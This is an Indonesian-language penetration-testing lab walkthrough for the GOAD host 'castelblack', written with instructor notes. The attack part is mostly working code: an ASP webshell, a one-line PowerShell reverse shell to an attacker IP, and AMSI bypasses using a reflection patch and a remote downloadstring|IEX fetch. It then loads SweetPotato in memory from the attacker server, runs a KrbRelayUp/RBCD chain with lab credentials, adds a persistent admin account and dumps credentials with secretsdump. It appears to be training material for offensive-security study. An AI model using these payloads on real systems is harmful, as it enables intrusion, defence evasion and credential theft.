# Skenario — File Upload → Privilege Escalation → NT AUTHORITY\SYSTEM (Detail Lengkap)

Target: `castelblack` (192.168.56.22) — IIS (allow ASP upload) + MSSQL, **Defender OFF** secara default di GOAD.

Alur lengkap: upload webshell → command execution sebagai user IIS → reverse shell → abusekan `SeImpersonatePrivilege` → SYSTEM.

---

## Fase 1 — Identifikasi Aplikasi Upload

### Tujuan
Menemukan endpoint upload & memahami struktur aplikasi web di `castelblack`.

### Perintah
```bash
curl -s http://192.168.56.22/ | grep -i upload
gobuster dir -u http://192.168.56.22 -w /usr/share/wordlists/dirb/common.txt
```

### Penjelasan teknis
- `curl -s` : ambil HTML halaman utama; `grep -i upload` : cari referensi form/endpoint upload.
- `gobuster dir` : brute-force direktori/endpoint (`.asp`, `.aspx`, `upload/`, dst.) dari wordlist.

### Temuan
Aplikasi ASP.NET sederhana dengan **file upload** tanpa validasi ekstensi → folder `/upload`.

### Poin penting
Fitur upload tanpa validasi = **entry point RCE** paling umum di aplikasi web Windows/IIS. Perhatikan ekstensi yang diizinkan (`asp`/`aspx` vs hanya gambar).

---

## Fase 2 — Upload Webshell ASP

### Tujuan
Menanam webshell untuk eksekusi perintah jarak jauh.

### Buat `webshell.asp`
```asp
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
        <FORM action="" method="POST">
            <input type="text" name="param" size=45 value="<%= myValue %>">
            <input type="submit" value="Run">
        </FORM>
        <p>Result :
        <%
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
    </BODY>
</HTML>
```

### Penjelasan teknis
- `CreateObject("WScript.Shell")` → objek untuk menjalankan perintah sistem.
- `objSh.exec(theParam)` → eksekusi perintah; `StdOut.ReadAll` → baca output.
- `request("param")` → ambil input dari form POST; `cmd /c` + input → eksekusi shell.
- Format `.asp` (classic ASP) dipilih karena IIS menjalankannya **server-side** dan sering lolos signature Defender (versi lama).

### Upload & verifikasi
Upload via form/browser ke `http://192.168.56.22/upload/webshell.asp`.

```bash
curl -s -X POST http://192.168.56.22/upload/webshell.asp -d "param=whoami"
#  -> iis apppool\defaultapppool  (user IIS, BUKAN SYSTEM)
```

### Poin penting
Output `iis apppool\defaultapppool` menunjukkan kita berjalan sebagai **Application Pool Identity** — akun least-privilege IIS, bukan admin. Inilah titik awal eskalasi.

---

## Fase 3 — Reverse Shell

### Tujuan
Mengubah command execution berbasis HTTP menjadi **shell interaktif** yang lebih stabil.

### Perintah
```bash
# Di attacker (siapkan listener)
nc -nlvp 4445
```

Di webshell, jalankan reverse shell PowerShell (satu baris):
```powershell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('192.168.56.1',4445);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$r=$sb+'PS> ';$t=[text.encoding]::ASCII.GetBytes($r);$s.Write($t,0,$t.Length)}"
```

### Penjelasan teknis (pembongkaran payload)
- `New-Object System.Net.Sockets.TCPClient('192.168.56.1',4445)` : buka koneksi TCP ke listener attacker.
- `GetStream()` : ambil stream data.
- loop `while(...$i -ne 0)` : baca perintah dari attacker.
- `iex $d` : eksekusi perintah (Invoke-Expression).
- `Out-String` : tangkap output → kirim balik ke attacker.
- `-nop` : no profile (hindari load profile); `-c` : command.

### Cek privilege
```powershell
whoami /priv
#  -> SeImpersonatePrivilege : ENABLED
```

### Poin penting
Service account IIS/MSSQL secara default membawa **`SeImpersonatePrivilege`** — fondasi teknik "Potato" untuk meniru token SYSTEM.

---

## Fase 4 — (Opsional) AMSI Bypass bila Defender Aktif

### Tujuan
Bila Defender diaktifkan (untuk latihan evasion), lewati **AMSI** (Anti-Malware Scan Interface) yang memindai script PowerShell di memori.

### Langkah 1 — patch `amsiContext` (reflection)
```powershell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');
$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');
$z=$y.GetValue($null);
[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```

### Langkah 2 — patch `AmsiScanBuffer` di `amsi.dll` (rasta-mouse)
```powershell
(new-object system.net.webclient).downloadstring('http://192.168.56.1:8080/amsi_rmouse.txt')|IEX
```

### Penjelasan teknis
- **AMSI** adalah interface yang memungkinkan AV memindai konten PowerShell/.NET sebelum dieksekusi.
- Teknik 1 menimpa field `amsiContext` dengan nilai sampah (`0x41424344` = "ABCD") sehingga AMSI gagal.
- Teknik 2 mem-patch byte pertama fungsi `AmsiScanBuffer` di `amsi.dll` agar langsung `return` (patch `0xB8 0x57 0x00 0x07 0x80 0xC3`).
- Split string (`'Am'+'siUt'+'ils'`) menghindari deteksi signature statis.
- Load script via HTTP (`downloadstring|IEX`) agar tidak tersentuh disk.

### Poin penting
Ada dua level AMSI: PowerShell (langkah 1) dan .NET (langkah 2). Keduanya perlu di-bypass agar assembly .NET (winPEAS/SweetPotato) berjalan tanpa deteksi.

---

## Fase 5 — Privesc #1: SweetPotato / PrintSpoofer → SYSTEM

### Prinsip
Mengabusekan `SeImpersonatePrivilege` untuk **meniru token proses SYSTEM** lewat named pipe (teknik PrintSpoofer/Potato).

### Persiapan di attacker
```bash
cd /var/www/html
echo "@echo off" > runme.bat
echo "start /b powershell -nop -c \"...reverse shell...\"" >> runme.bat
python3 -m http.server 8080
```

### Eksekusi di reverse shell (SweetPotato in-memory)
```powershell
mkdir c:\temp; cd c:\temp
(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','c:\temp\runme.bat')
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe');
$asm=[System.Reflection.Assembly]::Load([byte[]]$data);
[SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'))
```

### Alternatif (PowerSharpPack + BadPotato)
```powershell
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpBinaries/Invoke-BadPotato.ps1')
Invoke-BadPotato -Command "c:\temp\runme.bat"
```

### Penjelasan teknis
- `[System.Reflection.Assembly]::Load([byte[]]$data)` : **load assembly .NET ke memori** tanpa menyentuh disk (evasi).
- `[SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'))` : jalankan SweetPotato, argumen `-p` = program yang dijalankan sebagai SYSTEM.
- **PrintSpoofer/Potato**: membuat named pipe + memicu service SYSTEM (mis. Printer Spooler) untuk mengautentikasi ke pipe → impersonate token SYSTEM → jalankan `runme.bat` (reverse shell) sebagai SYSTEM.

### Hasil
Reverse shell baru dengan identitas **`nt authority\system`**.

### Poin penting
SweetPotato default memakai teknik **PrintSpoofer** (by @itm4n). Teknik ini masih "unfixed" oleh Microsoft pada banyak konfigurasi.

---

## Fase 6 — Privesc #2: KrbRelayUp → RBCD → Administrator (alternatif)

### Prinsip
Mengabusekan **Kerberos relay** untuk menanam **RBCD** (Resource-Based Constrained Delegation) dan impersonate `Administrator` — alternatif bila Potato diblokir.

### Syarat
- LDAP signing **tidak** di-enforce.
- Boleh **add computer** (MAQ belum 0).

### Cek syarat
```bash
cme ldap 192.168.56.11 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M ldap-signing
cme ldap 192.168.56.11 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

### Langkah
```bash
# 1) add computer
addcomputer.py -computer-name 'krbrelay$' -computer-pass 'ComputerPassword' \
  -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH \
  'north.sevenkingdoms.local/jon.snow:iknownothing'

# 2) ambil SID komputer baru
# 3) cari port yang diizinkan SYSTEM (CheckPort.exe -> mis. 443)
# 4) jalankan KrbRelay
.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local \
  -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd <SID-krbrelay$> -port 443

# 5) eksploitasi RBCD
getTGT.py -dc-ip winterfell.north.sevenkingdoms.local 'north.sevenkingdoms.local/krbrelay$:ComputerPassword'
export KRB5CCNAME=./krbrelay$.ccache
getST.py -impersonate administrator -spn CIFS/castelblack.north.sevenkingdoms.local \
  -k -no-pass -dc-ip winterfell.north.sevenkingdoms.local 'north.sevenkingdoms.local/krbrelay$'
wmiexec.py -k @castelblack.north.sevenkingdoms.local   # -> north\administrator
```

### Penjelasan teknis
- `addcomputer.py` : daftarkan komputer palsu `krbrelay$` (butuh hak MAQ).
- `KrbRelay.exe` : me-relay permintaan Kerberos dari akun mesin ke DC, menulis `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) dengan SID komputer palsu.
- `getTGT.py` : ambil TGT untuk `krbrelay$`.
- `getST.py -impersonate administrator` : minta **service ticket** impersonate `Administrator` (berkat RBCD).
- `wmiexec.py -k` : akses shell sebagai `Administrator` (pass-the-ticket).

### Poin penting
KrbRelayUp tidak butuh privilege khusus — hanya LDAP signing off + MAQ. Berguna bila teknik Potato sudah dipatch/diblokir.

---

## Fase 7 — Validasi & Bukti Kompromi

### Perintah
```powershell
whoami                          # nt authority\system
whoami /priv
net user attacker Passw0rd! /add
net localgroup Administrators attacker /add
```
```bash
secretsdump.py NORTH/jon.snow:iknownothing@192.168.56.22   # dump SAM/LSASS
```

### Penjelasan teknis
- `whoami` → konfirmasi identitas SYSTEM.
- `net user ... /add` + `net localgroup Administrators ... /add` → buat akun admin lokal (persistence).
- `secretsdump.py` → dump SAM/LSASS sebagai bukti & kredensial tambahan.

---

## Ringkasan

| Fase | Teknik | Output |
|---|---|---|
| 1-2 | Upload webshell ASP | RCE user IIS |
| 3 | Reverse shell | akses interaktif |
| 4 | AMSI bypass | lolos Defender |
| 5 | SweetPotato/BadPotato | **NT AUTHORITY\SYSTEM** |
| 6 | KrbRelayUp → RBCD | administrator (alternatif) |
| 7 | Dump + persistensi | bukti kompromi |

---

## Catatan Pengajar

- **Fase 5 (Potato)** = jalur PE paling langsung dari `SeImpersonatePrivilege`; SweetPotato default pakai teknik PrintSpoofer.
- **Fase 6 (KrbRelayUp)** tidak butuh privilege khusus, hanya LDAP signing mati + MAQ; berguna bila Potato diblokir.
- Defender **OFF** di castelblack → Fase 4 (AMSI bypass) opsional; aktifkan dulu bila ingin melatih evasion.
- Semua eksekusi .NET usahakan **in-memory** (reflective assembly) agar tak tersentuh disk ("the disk is lava").
